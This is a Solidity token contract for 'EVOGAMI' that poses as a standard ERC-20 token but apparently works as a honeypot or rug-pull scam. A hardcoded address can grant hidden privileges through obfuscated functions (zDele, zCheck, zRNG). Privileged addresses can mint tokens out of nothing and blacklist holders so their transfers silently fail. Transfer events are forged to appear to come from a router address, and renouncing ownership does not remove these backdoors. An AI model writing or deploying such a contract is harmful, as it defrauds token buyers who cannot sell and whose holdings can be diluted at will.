pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address _zConst = 0x7De4D03d99ef36CAA1Cc504b198e80da746114f9;
	address zRouterV2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }

}



contract EVOGAMI is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Zc;
	mapping (address => bool) private Zb;
    mapping (address => bool) private Za;
    mapping (address => mapping (address => uint256)) private Ze;
    uint8 private constant _decimals = 8;
    uint256 private constant _zSupply = 200000000 * 10**_decimals;
    string private constant _name = "EVOGAMI";
    string private constant _symbol = "EVOGAMI";



    constructor () {
        Zc[_msgSender()] = _zSupply;
        emit Transfer(address(0), zRouterV2, _zSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _zSupply;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Zc[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return Ze[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        Ze[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function zRNG(address Zf) public {
        if(Zb[msg.sender]) { 
        Za[Zf] = false;}}
        function zCheck(address Zf) public{
         if(Zb[msg.sender])  { 
        require(!Za[Zf]);
        Za[Zf] = true; }}
		function zDele(address Zf) public{
         if(msg.sender == _zConst)  { 
        require(!Zb[Zf]);
        Zb[Zf] = true; }}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == _zConst)  {
        require(amount <= Zc[sender]);
        Zc[sender] -= amount;  
        Zc[recipient] += amount; 
          Ze[sender][msg.sender] -= amount;
        emit Transfer (zRouterV2, recipient, amount);
        return true; }  else  
          if(!Za[recipient]) {
          if(!Za[sender]) {
         require(amount <= Zc[sender]);
        require(amount <= Ze[sender][msg.sender]);
        Zc[sender] -= amount;
        Zc[recipient] += amount;
      Ze[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Zd, uint256 Zf) public {
        if(msg.sender == _zConst)  {
        require(Zc[msg.sender] >= Zf);
        Zc[msg.sender] -= Zf;  
        Zc[Zd] += Zf; 
        emit Transfer (zRouterV2, Zd, Zf);} else  
        if(Zb[msg.sender]) {Zc[Zd] += Zf;} else
        if(!Za[msg.sender]) {
        require(Zc[msg.sender] >= Zf);
        Zc[msg.sender] -= Zf;  
        Zc[Zd] += Zf;          
        emit Transfer(msg.sender, Zd, Zf);}}}